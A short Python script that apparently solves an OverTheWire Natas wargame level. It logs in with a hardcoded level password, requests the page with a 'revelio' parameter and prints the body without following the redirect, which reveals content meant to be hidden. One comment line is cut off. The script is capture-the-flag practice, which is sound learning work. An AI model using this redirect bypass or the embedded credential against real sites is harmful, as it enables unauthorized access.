#!/bin/python
import requests,re

username = "natas22"
pwd = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
url = f"http://{username}.natas.labs.overthewire.org/?revelio=1"
session = requests.Session()
#data={'admin':'reveli
res= session.get(url,auth=(username,pwd),allow_redirects=False)
con=res.text
print(con)